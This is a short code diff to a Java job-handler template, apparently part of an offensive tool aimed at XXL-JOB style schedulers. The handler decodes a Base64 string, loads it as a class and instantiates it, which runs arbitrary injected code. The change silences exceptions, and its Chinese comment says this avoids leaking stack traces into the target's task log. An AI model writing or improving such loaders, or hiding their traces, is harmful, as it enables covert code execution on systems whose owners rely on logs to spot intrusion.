@@ -27,8 +27,8 @@ public class DemoGlueJobHandler extends IJobHandler {
         } catch (ClassNotFoundException e) {
             try {
                 new Definder().defineClass(Base64.getDecoder().decode(base64Str)).newInstance();
-            } catch (Throwable ee) {
-                ee.printStackTrace();
+            } catch (Throwable ignored) {
+                // 保持模板静默，避免向目标任务日志泄漏堆栈。
             }
         }
         return ReturnT.SUCCESS;
